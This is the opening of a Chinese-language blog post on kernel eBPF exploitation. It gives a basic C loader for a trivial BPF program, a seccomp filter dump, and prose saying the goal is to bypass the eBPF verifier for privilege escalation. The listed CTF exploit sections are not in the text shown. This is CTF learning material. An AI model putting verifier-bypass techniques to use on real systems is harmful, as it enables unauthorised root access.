<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>内核ebpfpwn（未完成版） - J4f&#39;s blog</title><meta name="author" content=" ">
<meta name="description" content="">
  <meta itemprop="name" content="内核ebpfpwn（未完成版）">
  <meta itemprop="datePublished" content="2026-02-02T12:14:05+08:00">
  <meta itemprop="dateModified" content="2026-02-02T12:18:53+08:00">
  <meta itemprop="wordCount" content="7170">
  <meta itemprop="keywords" content="Pwn"><meta property="og:url" content="http://localhost:1313/posts/kernel_ebpfpwn/">
  <meta property="og:site_name" content="J4f&#39;s blog">
  <meta property="og:title" content="内核ebpfpwn（未完成版）">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-02-02T12:14:05+08:00">
    <meta property="article:modified_time" content="2026-02-02T12:18:53+08:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="内核ebpfpwn（未完成版）">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/1.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/kernel_ebpfpwn/" title="内核ebpfpwn（未完成版） - J4f&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/phppwn_note/" title="Phppwn笔记" /><link rel="next" type="text/html" href="http://localhost:1313/posts/protobuf/" title="Protobuf笔记" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/kernel_ebpfpwn/index.md" title="内核ebpfpwn（未完成版） - J4f's blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "内核ebpfpwn（未完成版）",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/kernel_ebpfpwn\/"
    },"genre": "posts","wordcount":  7170 ,
    "url": "http:\/\/localhost:1313\/posts\/kernel_ebpfpwn\/","datePublished": "2026-02-02T12:14:05+08:00","dateModified": "2026-02-02T12:18:53+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": " "
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Cancel
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item menu-system"></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>内核ebpfpwn（未完成版）</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
       </span></span><span class="post-included-in">&nbsp;included in <a href="/categories/pwn/" class="post-category" title="Category - Pwn"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div><div class="post-meta-line"><span title="published on 2026-02-02 12:14:05"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-02-02">2026-02-02</time></span>&nbsp;<span title="7170 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 7200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>34 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#基础知识">基础知识</a>
      <ul>
        <li><a href="#常用代码">常用代码</a></li>
        <li><a href="#什么是ebpf">什么是ebpf</a></li>
        <li><a href="#bpf程序架构">bpf程序架构</a>
          <ul>
            <li><a href="#寄存器">寄存器</a></li>
          </ul>
        </li>
        <li><a href="#verifier">verifier</a>
          <ul>
            <li><a href="#寄存器状态跟踪">寄存器状态跟踪</a></li>
            <li><a href="#一些规则">一些规则</a></li>
          </ul>
        </li>
        <li><a href="#alu-sanitation">ALU Sanitation</a></li>
        <li><a href="#源码">源码</a>
          <ul>
            <li><a href="#bpf_prog_load">bpf_prog_load</a></li>
            <li><a href="#bpf_check">bpf_check</a></li>
            <li><a href="#check_subprogs">check_subprogs</a></li>
          </ul>
        </li>
        <li><a href="#指令编写">指令编写</a>
          <ul>
            <li><a href="#alu类">ALU类</a></li>
            <li><a href="#赋值类">赋值类</a></li>
            <li><a href="#内存读写类">内存读写类</a></li>
            <li><a href="#跳转指令">跳转指令</a></li>
            <li><a href="#其他指令">其他指令</a></li>
          </ul>
        </li>
        <li><a href="#proc接口">proc接口</a></li>
        <li><a href="#调试">调试</a>
          <ul>
            <li><a href="#查结构体">查结构体</a></li>
            <li><a href="#实际执行bpf程序">实际执行bpf程序</a></li>
            <li><a href="#pwndbg">pwndbg</a></li>
          </ul>
        </li>
        <li><a href="#pwn思路">pwn思路</a></li>
        <li><a href="#模板">模板</a></li>
      </ul>
    </li>
    <li><a href="#例题">例题</a>
      <ul>
        <li>
          <ul>
            <li><a href="#sec-con-ctf-2021-kone_gadget">SEC CON CTF 2021 kone_gadget</a>
              <ul>
                <li><a href="#编写shellcode">编写shellcode</a></li>
              </ul>
            </li>
            <li><a href="#d3ctf-2022__d3bpf">D^3CTF 2022__d3bpf</a>
              <ul>
                <li><a href="#任意地址读写">任意地址读写</a></li>
                <li><a href="#思路流程">思路流程</a></li>
                <li><a href="#exp">exp</a></li>
              </ul>
            </li>
            <li><a href="#d3ctf-2022__d3bpf-v2">D^3CTF 2022__d3bpf-v2</a></li>
            <li><a href="#uoftctf-2026----extended-ebpf">UofTCTF 2026 - extended-eBPF</a>
              <ul>
                <li><a href="#源码-1">源码</a></li>
                <li><a href="#利用思路">利用思路</a></li>
              </ul>
            </li>
            <li><a href="#downunderctf-2025_rolling-around">DownUnderCTF 2025_Rolling Around</a></li>
            <li><a href="#阿里云ctf-2025-beebee">阿里云CTF 2025 beebee</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ref">ref</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="基础知识"><span>基础知识</span>
  <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="常用代码"><span>常用代码</span>
  <a href="#%e5%b8%b8%e7%94%a8%e4%bb%a3%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//gcc ./bpf.c -o bpf
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;  //为了exit()函数</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;    //为了uint64_t等标准类型的定义</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;    //为了错误处理</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;    //位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;    //为了syscall()</span><span class="cp">
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//类型转换, 减少warning, 也可以不要
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ptr_to_u64(x) ((uint64_t)x)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//对于系统调用的包装, __NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互
</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_cmd</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">attr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//用于保存BPF验证器的输出日志
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_BUF_SIZE 0x1000
</span></span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//通过系统调用, 向内核加载一段BPF指令
</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">type</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span><span class="o">*</span> <span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">insn_cnt</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">license</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">type</span><span class="p">,</span>        <span class="c1">//程序类型
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="nf">ptr_to_u64</span><span class="p">(</span><span class="n">insns</span><span class="p">),</span>    <span class="c1">//指向指令数组的指针
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">insn_cnt</span><span class="p">,</span>    <span class="c1">//有多少条指令
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="nf">ptr_to_u64</span><span class="p">(</span><span class="n">license</span><span class="p">),</span>    <span class="c1">//指向整数字符串的指针
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="nf">ptr_to_u64</span><span class="p">(</span><span class="n">bpf_log_buf</span><span class="p">),</span>    <span class="c1">//log输出缓冲区
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>    <span class="c1">//log缓冲区大小
</span></span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>    <span class="c1">//log等级
</span></span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf</span><span class="p">(</span><span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令
</span></span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">bpf_prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x2</span> <span class="p">},</span> <span class="c1">//初始化一个struct bpf_insn, 指令含义: mov r0, 0x2;
</span></span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x0</span> <span class="p">},</span> <span class="c1">//初始化一个struct bpf_insn, 指令含义: exit;
</span></span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//加载一个bpf程序
</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">prog_fd</span> <span class="o">=</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span> <span class="n">bpf_prog</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bpf_prog</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">bpf_prog</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">prog_fd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;BPF load prog&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;prog_fd: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prog_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">bpf_log_buf</span><span class="p">);</span>    <span class="c1">//输出程序日志
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h3 class="heading-element" id="什么是ebpf"><span>什么是ebpf</span>
  <a href="#%e4%bb%80%e4%b9%88%e6%98%afebpf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>我们熟悉的<code>seccomp</code>就是一个被<code>attach</code>到系统调用的<code>bpf</code>程序，每次进行系统调用前都会执行这个<code>bpf</code>程序，禁掉一些系统调用</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> line  CODE  JT   JF      K
</span></span><span class="line"><span class="cl">=================================
</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  A = arch
</span></span><span class="line"><span class="cl"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
</span></span><span class="line"><span class="cl"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
</span></span><span class="line"><span class="cl"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
</span></span><span class="line"><span class="cl"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
</span></span><span class="line"><span class="cl"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
</span></span><span class="line"><span class="cl"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
</span></span><span class="line"><span class="cl"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
</span></span><span class="line"><span class="cl"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</span></span><span class="line"><span class="cl"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p><code>ebpf</code>的作用不仅局限于此，它能够<code>attach</code>到内核里几乎任何地方，在内核中存取数据等等</p>
<p>但是，这个<code>bpf</code>程序是我们自己写的，它还会被放入内核，这是不安全的，所以我们写的<code>bpf</code>程序会通过<code>ebpf verifier</code>进行检查，才能被放入内核</p>
<p>其次，<code>bpf</code>程序有他的一套架构（寄存器，指令集这些），所以他要被编译(JIT compilier)成x86的汇编，才能被执行</p>
<p>如果<code>ebpf verifier</code>能被绕过，那我们就能把我们写的<code>bpf</code>程序<code>attach</code>到某个地方，然后执行它进行提权。这也是<code>ebpf pwn</code>学习的主要内容：绕过<code>ebpf verifier</code>的检查，进行提权。</p>
<h3 class="heading-element" id="bpf程序架构"><span>bpf程序架构</span>
  <a href="#bpf%e7%a8%8b%e5%ba%8f%e6%9e%b6%e6%9e%84" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="寄存器"><span>寄存器</span>
  <a href="#%e5%af%84%e5%ad%98%e5%99%a8" class="heading-mark">
